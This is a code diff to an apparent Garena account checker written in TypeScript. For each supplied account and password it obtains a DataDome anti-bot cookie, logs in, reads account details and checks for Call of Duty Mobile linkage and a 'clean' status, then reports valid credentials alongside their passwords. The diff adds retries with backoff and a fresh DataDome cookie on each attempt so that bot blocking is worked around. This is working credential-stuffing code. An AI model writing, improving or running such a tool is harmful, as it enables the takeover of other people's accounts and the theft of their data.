@@ -159,7 +159,24 @@ async function hashPassword(password: string, v1: string, v2: string): Promise<s
   return encrypted;
 }
 
-// Get DataDome cookie
+// Retry configuration
+const RETRY_CONFIG = {
+  maxRetries: 3,
+  baseDelay: 1000, // 1 second
+  maxDelay: 5000,  // 5 seconds max
+};
+
+// Delay helper with exponential backoff
+async function delay(attempt: number): Promise<void> {
+  const delayMs = Math.min(
+    RETRY_CONFIG.baseDelay * Math.pow(2, attempt) + Math.random() * 500,
+    RETRY_CONFIG.maxDelay
+  );
+  console.log(`[RETRY] Waiting ${Math.round(delayMs)}ms before attempt ${attempt + 2}`);
+  await new Promise(resolve => setTimeout(resolve, delayMs));
+}
+
+// Get DataDome cookie with retry
 async function getDataDomeCookie(): Promise<string | null> {
   try {
     const url = 'https://dd.garena.com/js/';
@@ -503,88 +520,123 @@ function parseAccountDetails(data: Record<string, unknown>): Record<string, unkn
   };
 }
 
-// Main check account function
+// Main check account function with retry logic
 async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
   console.log('[CHECK] Starting:', account);
   
-  try {
-    // Step 1: Get DataDome cookie
-    const datadome = await getDataDomeCookie();
-    if (!datadome) {
-      console.log('[CHECK] Failed to get DataDome');
-      return {
-        account, password,
-        status: 'error',
-        message: 'Failed to get DataDome cookie',
-        isClean: false, hasCodm: false
-      };
+  let lastError = '';
+  
+  for (let attempt = 0; attempt <= RETRY_CONFIG.maxRetries; attempt++) {
+    if (attempt > 0) {
+      console.log(`[CHECK] Retry attempt ${attempt}/${RETRY_CONFIG.maxRetries} for: ${account}`);
     }
     
-    // Step 2: Prelogin
-    const preloginResult = await prelogin(account, datadome);
-    if (!preloginResult) {
-      return {
-        account, password,
-        status: 'invalid',
-        message: 'Account not found or blocked',
-        isClean: false, hasCodm: false
-      };
-    }
+    try {
+      // Step 1: Get fresh DataDome cookie for each attempt
+      const datadome = await getDataDomeCookie();
+      if (!datadome) {
+        lastError = 'Failed to get DataDome cookie';
+        console.log('[CHECK] Failed to get DataDome, will retry...');
+        if (attempt < RETRY_CONFIG.maxRetries) {
+          await delay(attempt);
+          continue;
+        }
+        return {
+          account, password,
+          status: 'error',
+          message: lastError,
+          isClean: false, hasCodm: false,
+          retryAttempts: attempt + 1
+        };
+      }
+      
+      // Step 2: Prelogin with DataDome check
+      const preloginResult = await prelogin(account, datadome);
+      if (!preloginResult) {
+        // Check if this was a DataDome block (403) - retry if so
+        lastError = 'Account not found or DataDome blocked';
+        console.log('[CHECK] Prelogin failed, checking if retryable...');
+        if (attempt < RETRY_CONFIG.maxRetries) {
+          await delay(attempt);
+          continue;
+        }
+        return {
+          account, password,
+          status: 'invalid',
+          message: lastError,
+          isClean: false, hasCodm: false,
+          retryAttempts: attempt + 1
+        };
+      }
 
-    // Step 3: Login
-    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, datadome);
-    if ('error' in loginResult) {
-      return {
-        account, password,
-        status: 'invalid',
-        message: loginResult.error,
-        isClean: false, hasCodm: false
-      };
-    }
+      // Step 3: Login
+      const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, datadome);
+      if ('error' in loginResult) {
+        // Login errors are not retryable (wrong password, etc)
+        console.log('[CHECK] Login failed (not retryable):', loginResult.error);
+        return {
+          account, password,
+          status: 'invalid',
+          message: loginResult.error,
+          isClean: false, hasCodm: false,
+          retryAttempts: attempt + 1
+        };
+      }
 
-    console.log('[CHECK] Login SUCCESS!');
-    
-    // Step 4: Get account info
-    const accountData = await getAccountInfo(loginResult.ssoKey, datadome);
-    const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };
+      console.log('[CHECK] Login SUCCESS!');
+      
+      // Step 4: Get account info
+      const accountData = await getAccountInfo(loginResult.ssoKey, datadome);
+      const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };
 
-    // Step 5: Check CODM
-    let hasCodm = false;
-    let codmInfo: Record<string, unknown> = {};
-    
-    const codmToken = await getCodmAccessToken(loginResult.ssoKey);
-    if (codmToken) {
-      const callbackResult = await processCodmCallback(codmToken);
-      if (callbackResult.status === 'success' && callbackResult.token) {
-        const codmUser = await getCodmUserInfo(callbackResult.token);
-        if (codmUser) {
-          hasCodm = true;
-          codmInfo = codmUser;
+      // Step 5: Check CODM
+      let hasCodm = false;
+      let codmInfo: Record<string, unknown> = {};
+      
+      const codmToken = await getCodmAccessToken(loginResult.ssoKey);
+      if (codmToken) {
+        const callbackResult = await processCodmCallback(codmToken);
+        if (callbackResult.status === 'success' && callbackResult.token) {
+          const codmUser = await getCodmUserInfo(callbackResult.token);
+          if (codmUser) {
+            hasCodm = true;
+            codmInfo = codmUser;
+          }
         }
       }
+
+      console.log(`[CHECK] Complete: valid, hasCodm=${hasCodm}, isClean=${details.is_clean}, attempts=${attempt + 1}`);
+
+      return {
+        account, password,
+        status: 'valid',
+        isClean: details.is_clean,
+        hasCodm,
+        details,
+        codm: codmInfo,
+        retryAttempts: attempt + 1
+      };
+
+    } catch (error) {
+      lastError = error instanceof Error ? error.message : String(error);
+      console.error(`[CHECK] Error on attempt ${attempt + 1}:`, lastError);
+      
+      if (attempt < RETRY_CONFIG.maxRetries) {
+        await delay(attempt);
+        continue;
+      }
     }
-
-    console.log(`[CHECK] Complete: valid, hasCodm=${hasCodm}, isClean=${details.is_clean}`);
-
-    return {
-      account, password,
-      status: 'valid',
-      isClean: details.is_clean,
-      hasCodm,
-      details,
-      codm: codmInfo
-    };
-
-  } catch (error) {
-    const msg = error instanceof Error ? error.message : String(error);
-    console.error('[CHECK] Error:', msg);
-    return {
-      account, password,
-      status: 'error',
-      message: msg,
-      isClean: false, hasCodm: false
-    };
   }
+  
+  // All retries exhausted
+  console.error('[CHECK] All retries exhausted for:', account);
+  return {
+    account, password,
+    status: 'error',
+    message: `Failed after ${RETRY_CONFIG.maxRetries + 1} attempts: ${lastError}`,
+    isClean: false, hasCodm: false,
+    retryAttempts: RETRY_CONFIG.maxRetries + 1
+  };
 }
 
 // Input validation for accounts
